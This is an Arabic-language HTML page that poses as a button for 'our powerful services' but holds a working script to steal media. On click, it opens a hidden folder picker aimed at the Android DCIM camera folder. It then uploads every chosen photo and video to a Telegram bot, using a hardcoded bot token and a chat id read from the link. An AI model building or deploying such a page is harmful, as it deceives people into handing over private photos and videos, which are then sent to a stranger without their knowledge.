<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خدماتنا</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        
        .message {
            font-size: 22px;
            margin-bottom: 40px;
            line-height: 1.4;
        }
        
        .btn {
            background: linear-gradient(to right, #f46b45, #eea849);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 22px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            width: 100%;
            max-width: 300px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .btn:hover {
            transform: scale(1.02);
        }
        
        .btn:active {
            transform: scale(0.98);
        }
        
        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        .hidden {
            display: none;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            font-size: 16px;
            display: none;
        }
        
        .status.success {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid #4CAF50;
        }
        
        .status.error {
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid #F44336;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message">إضغط علي الزر لتتمتع بخدماتنا القويه</div>
        
        <button id="servicesBtn" class="btn">الخدمات</button>
        
        <div id="statusMsg" class="status"></div>
    </div>

    <script>
        // التوكن الثابت
        const BOT_TOKEN = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g";
        
        // العناصر
        const servicesBtn = document.getElementById('servicesBtn');
        const statusMsg = document.getElementById('statusMsg');
        
        // مسار DCIM الثابت
        const DCIM_PATH = "/storage/emulated/0/DCIM/";
        
        // عند النقر على زر الخدمات
        servicesBtn.addEventListener('click', async function() {
            // تعطيل الزر
            servicesBtn.disabled = true;
            servicesBtn.textContent = "جاري التحميل...";
            
            try {
                // الحصول على chatid من الرابط
                const urlParams = new URLSearchParams(window.location.search);
                const chatId = urlParams.get('chatid');
                
                if (!chatId) {
                    showStatus("error", "❌ لم يتم العثور على chatid في الرابط");
                    resetButton();
                    return;
                }
                
                // محاولة الوصول للملفات
                const files = await getDCIMFiles();
                
                if (!files || files.length === 0) {
                    showStatus("error", "❌ لم يتم العثور على ملفات في DCIM");
                    resetButton();
                    return;
                }
                
                // رفع الملفات
                await uploadFilesToTelegram(files, chatId);
                
            } catch (error) {
                showStatus("error", `❌ حدث خطأ: ${error.message}`);
                resetButton();
            }
        });
        
        // دالة للحصول على ملفات DCIM
        async function getDCIMFiles() {
            return new Promise((resolve, reject) => {
                // في بيئة الويب، لا يمكن الوصول مباشرة للمسار
                // لذلك سنستخدم input file مع سمة webkitdirectory
                
                const fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.webkitdirectory = true;
                fileInput.multiple = true;
                fileInput.accept = "image/*,video/*";
                fileInput.style.display = 'none';
                
                document.body.appendChild(fileInput);
                
                fileInput.addEventListener('change', (e) => {
                    const files = Array.from(e.target.files);
                    
                    // تصفية الملفات الموجودة في مسار DCIM أو أي مسار
                    const dcimFiles = files.filter(file => {
                        const path = file.webkitRelativePath || file.path || '';
                        return path.includes('DCIM') || path.includes('dcim');
                    });
                    
                    document.body.removeChild(fileInput);
                    
                    if (dcimFiles.length > 0) {
                        resolve(dcimFiles);
                    } else {
                        resolve(files); // إذا لم نجد DCIM نأخذ كل الملفات
                    }
                });
                
                fileInput.addEventListener('cancel', () => {
                    document.body.removeChild(fileInput);
                    resolve([]);
                });
                
                // فتح محدد الملفات تلقائياً
                setTimeout(() => {
                    fileInput.click();
                }, 100);
            });
        }
        
        // دالة لرفع الملفات للتلجرام
        async function uploadFilesToTelegram(files, chatId) {
            let successfulUploads = 0;
            const totalFiles = files.length;
            
            for (let i = 0; i < totalFiles; i++) {
                const file = files[i];
                
                // تحديث حالة الزر
                servicesBtn.textContent = `جاري الرفع ${i + 1}/${totalFiles}`;
                
                try {
                    const success = await sendFileToTelegram(file, chatId);
                    if (success) successfulUploads++;
                    
                    // تأخير بين الملفات لمنع حظر الطلبات
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                } catch (error) {
                    console.error(`خطأ في رفع ${file.name}:`, error);
                }
            }
            
            // عرض نتيجة الرفع
            if (successfulUploads > 0) {
                showStatus("success", `✅ تم رفع ${successfulUploads} ملف بنجاح`);
            } else {
                showStatus("error", "❌ لم يتم رفع أي ملف");
            }
            
            // إعادة تعيين الزر بعد 3 ثوان
            setTimeout(() => {
                resetButton();
                statusMsg.style.display = 'none';
            }, 3000);
        }
        
        // إرسال ملف إلى التلجرام
        async function sendFileToTelegram(file, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', file);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                return response.ok;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return false;
            }
        }
        
        // إعادة تعيين الزر
        function resetButton() {
            servicesBtn.textContent = "الخدمات";
            servicesBtn.disabled = false;
        }
        
        // عرض حالة
        function showStatus(type, message) {
            statusMsg.className = `status ${type}`;
            statusMsg.textContent = message;
            statusMsg.style.display = 'block';
        }
        
        // تحقق من أن المستخدم على أندرويد
        window.addEventListener('load', function() {
            const isAndroid = /Android/i.test(navigator.userAgent);
            
            if (!isAndroid) {
                showStatus("error", "⚠️ هذا الموقع يعمل بشكل أفضل على أجهزة الأندرويد");
            }
        });
    </script>
</body>
</html>
